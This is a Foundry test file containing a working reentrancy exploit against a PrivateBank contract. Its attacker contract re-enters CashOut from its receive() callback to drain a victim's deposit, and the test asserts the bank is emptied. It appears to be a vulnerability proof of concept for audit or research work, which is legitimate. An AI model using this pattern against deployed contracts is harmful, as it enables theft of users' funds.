// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";
import "../src/0x23a91059fdc9579a9fbd0edc5f2ea0bfdb70deb4.sol";

contract ReentrancyAttacker {
    PrivateBank private immutable bank;
    bool private performingReentrancy;

    constructor(PrivateBank _bank) {
        bank = _bank;
    }

    function deposit() external payable {
        require(msg.value == 1 ether, "Deposit must be 1 ether");
        bank.Deposit{value: 1 ether}();
    }

    function attack(uint256 amount) external {
        bank.CashOut(amount);
    }

    function getContractBalance() external view returns (uint256) {
        return address(this).balance;
    }

    receive() external payable {
        if (!performingReentrancy && bank.balances(address(this)) >= msg.value) {
            performingReentrancy = true;
            bank.CashOut(msg.value);
            performingReentrancy = false;
        }
    }
}

contract PrivateBankTest is Test {
    Log public customLog;
    PrivateBank public privateBank;
    ReentrancyAttacker public attacker;
    address victim = makeAddr("victim");

    function setUp() public {
        customLog = new Log();
        privateBank = new PrivateBank(address(customLog));
        attacker = new ReentrancyAttacker(privateBank);

        // Fund test addresses
        vm.deal(address(attacker), 1 ether);
        vm.deal(victim, 1 ether);
    }

    function test_messagePaddingReentrancy() public {
        // Victim deposits funds
        vm.prank(victim);
        privateBank.Deposit{value: 1 ether}();

        // Attacker deposits funds
        vm.prank(address(attacker));
        attacker.deposit{value: 1 ether}();

        // Pre-attack balances
        assertEq(address(privateBank).balance, 2 ether, "Bank balance should be 2 ETH");
        assertEq(address(attacker).balance, 0, "Attacker balance should be 0");

        console2.log("--- BEFORE-Trigger Attack ---");
        uint256 bankBalanceBefore = address(privateBank).balance;
        uint256 attackerEtherBefore = address(attacker).balance;
        uint256 attackerDepositBefore = privateBank.balances(address(attacker));
        console2.log("Bank Balance: %d ether", bankBalanceBefore / 1 ether);
        console2.log("Attacker Ether Balance: %d ether", attackerEtherBefore / 1 ether);
        console2.log("Attacker Deposit Balance: %d ether", attackerDepositBefore / 1 ether);

        console2.log("--- Trigger Attack ---");
        // Execute attack
        vm.prank(address(attacker));
        attacker.attack(1 ether);

        console2.log("--- AFTER-Trigger Attack ---");
        uint256 bankBalanceAfter = address(privateBank).balance;
        uint256 attackerEtherAfter = address(attacker).balance;
        uint256 attackerDepositAfter = privateBank.balances(address(attacker));
        console2.log("Bank Balance: %d ether", bankBalanceAfter / 1 ether);
        console2.log("Attacker Ether Balance: %d ether", attackerEtherAfter / 1 ether);
        console2.log("Attacker Deposit Balance: %d ether", attackerDepositAfter / 1 ether);

        // Determine final verdict based on state changes
        bool bankDrained = bankBalanceAfter < bankBalanceBefore && bankBalanceAfter == 0;
        bool attackerGains = attackerEtherAfter > attackerEtherBefore && attackerEtherAfter >= 2 ether;
        if (bankDrained && attackerGains) {
            console2.log("Vulnerability Exists: Reentrancy allowed attacker to drain bank");
        } else {
            console2.log("Vulnerability not Exist: Bank funds not stolen");
        }

        // Post-attack validation (original assertions maintained)
        assertEq(address(privateBank).balance, 0, "Bank should be drained");
        uint256 attackerBalance = address(attacker).balance;
        assertTrue(attackerBalance >= 2 ether, "Attacker should have stolen funds");
        assertEq(attackerBalance, 2 ether, "Attacker should have exactly 2 ETH");
    }
}